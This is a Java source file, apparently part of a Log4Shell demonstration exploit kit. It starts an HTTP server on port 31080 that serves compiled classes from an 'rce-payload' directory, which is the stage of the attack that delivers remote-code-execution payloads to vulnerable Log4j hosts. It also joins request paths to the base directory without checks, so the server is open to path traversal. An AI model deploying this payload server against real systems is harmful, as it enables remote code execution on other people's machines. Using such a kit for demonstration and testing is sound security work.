package com.soprasteria.log4shell.exploitserver;

import com.sun.net.httpserver.HttpExchange;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;

public class HttpServer {
    private final int port;

    public HttpServer(int port) {
        this.port = port;
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        new HttpServer(31080).start();
        Thread.sleep(100000);
    }

    private void start() throws IOException {
        com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(port), 0);
        httpServer.createContext("/", this::handleFile);
        httpServer.start();
    }

    private void handleFile(HttpExchange httpExchange) throws IOException {
        System.out.println("Received request: " + httpExchange.getRequestURI());
        String path = httpExchange.getRequestURI().getPath();

        File basePath = new File("rce-payload/target/classes");

        File resolved = new File(basePath + path);

        if (!resolved.exists()) {
            System.out.println("Not found " + resolved.getCanonicalPath());
            httpExchange.sendResponseHeaders(404, -1);
            httpExchange.close();
            return;
        }
        if (resolved.isDirectory()) {
            resolved = new File(resolved, "index.html");
        }
        System.out.println("Serving " + resolved.getCanonicalPath());

        try {
            httpExchange.sendResponseHeaders(200, 0);
            try (OutputStream outputStream = httpExchange.getResponseBody()) {
                Files.copy(resolved.toPath(), outputStream);
            }
        } catch (IOException exception) {
            exception.printStackTrace();
        }
    }
}
